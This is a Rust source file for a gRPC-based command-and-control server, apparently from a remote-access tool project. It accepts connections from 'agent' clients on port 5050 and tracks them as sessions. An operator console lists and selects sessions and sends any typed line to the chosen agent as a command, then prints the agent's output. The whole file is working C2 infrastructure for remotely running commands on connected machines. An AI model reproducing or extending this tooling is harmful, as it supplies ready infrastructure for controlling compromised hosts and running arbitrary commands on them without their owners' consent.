use std::{collections::HashMap, io::Write, pin::Pin, sync::{Arc, Mutex}};
use futures::StreamExt;
use tokio::{io::AsyncBufReadExt, sync::mpsc};
use tokio_stream::wrappers::ReceiverStream;
use tonic::{Request, Response, Status, Streaming, transport::Server};
use crate::agent::{AgentCommand, AgentCommandResult, agent_service_server::{AgentService, AgentServiceServer}};

pub mod agent {
    tonic::include_proto!("c2agent");
}

type Sessions = Arc<Mutex<HashMap<u64, mpsc::Sender<Result<AgentCommand, Status>>>>>;

#[derive(Debug, Clone)]
pub struct C2AgentServer {
    sessions: Sessions,
    next_id: Arc<Mutex<u64>>
}

#[tonic::async_trait]
impl AgentService for C2AgentServer {
    // Allows the server to send multiple of request to client.
    type ControlStreamStream = Pin<Box<dyn futures::Stream<Item = Result<AgentCommand, Status>> + Send>>;

    async fn control_stream(
        &self,
        request: Request<Streaming<AgentCommandResult>>
    ) -> Result<Response<Self::ControlStreamStream>, Status> 
    {
        // Get incoming message from the client.
        let mut inbound = request.into_inner();

        // Async channel
        let (tx, rx) = mpsc::channel(128);

        // Assign a session ID and register this client.
        let session_id = {
            let mut next = self.next_id.lock().unwrap();
            *next += 1;
            *next
        };

        let tx_clone = tx.clone();
        self.sessions.lock().unwrap().insert(session_id, tx_clone);
        println!("[Server] New session opened: {}", session_id);

        let session = self.sessions.clone();

        // Spawn a task to handle incoming request from the client
        tokio::spawn(async move {
            while let Some(result) = inbound.next().await {
                match result {
                    Ok(msg) => {
                        println!("{}", msg.stdout);
                    }
                    Err(e) => {
                        eprintln!("[Server] Failed to receive the message: {}", e);
                        break;
                    }
                }
            }
            session.lock().unwrap().remove(&session_id);
            println!("[Server] Session {} disconnected.", session_id);
        });

        Ok(Response::new(Box::pin(ReceiverStream::new(rx))))
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let address = "0.0.0.0:5050".parse().unwrap();

    let sessions: Sessions = Arc::new(Mutex::new(HashMap::new()));
    let current = Arc::new(Mutex::new(None));

    {
        let sessions = sessions.clone();
        let current = current.clone();

        tokio::spawn(async move {
            let stdin = tokio::io::BufReader::new(tokio::io::stdin());
            let mut lines = stdin.lines();
            let mut counter = 0u64;

            loop {
                let active = *current.lock().unwrap();
                
                match active {
                    Some(id) => print!("[C2 Session {}] > ", id),
                    None => print!("[C2] > ")
                };

                std::io::stdout().flush().unwrap();

                let line = match lines.next_line().await {
                    Ok(Some(line)) => line.trim().to_string(),
                    _ => break
                };

                if line.is_empty() {
                    continue;
                }

                if line == "sessions" {
                    let map = sessions.lock().unwrap();

                    if map.is_empty() {
                        println!("[C2] No active sessions.");
                    }
                    else {
                        for id in map.keys() {
                            println!("\t{} {}", id, if Some(*id) == active { "(active)" } else {""});
                        }
                    }
                }
                else if let Some(arg) = line.strip_prefix("use ") {
                    match arg.trim().parse::<u64>() {
                        Ok(id) if sessions.lock().unwrap().contains_key(&id) => {
                            *current.lock().unwrap() = Some(id);
                            println!("[C2] Switched to session {}.", id);
                        }
                        _ => println!("[C2] No such session: {}", arg),
                    }
                }
                else if line == "back" || line == "background" {
                    *current.lock().unwrap() = None;
                }
                else if line == "quit" {
                    std::process::exit(0);
                }
                else {
                    let tx = match active {
                        Some(id) => sessions.lock().unwrap().get(&id).cloned(),
                        None => {
                            println!("[C2] No session selected. Use `sessions` `use <id>`");
                            continue;
                        }
                    };

                    let Some(tx) = tx else {
                        print!("[C2] Session is gone.");
                        *current.lock().unwrap() = None;
                        continue;
                    };

                    counter += 1;

                    let cmd = AgentCommand {
                        id: format!("cmd-{}", counter),
                        command: line
                    };

                    if tx.send(Ok(cmd)).await.is_err() {
                        println!("[C2] Client dropped while sending command.");
                        *current.lock().unwrap() = None;
                    }
                }
                tokio::time::sleep(std::time::Duration::from_secs(1)).await;
            }
        });
    }

    Server::builder()
        .add_service(AgentServiceServer::new(C2AgentServer {
            sessions,
            next_id: Arc::new(Mutex::new(0))
        }))
        .serve(address)
        .await?;

    Ok(()) 
}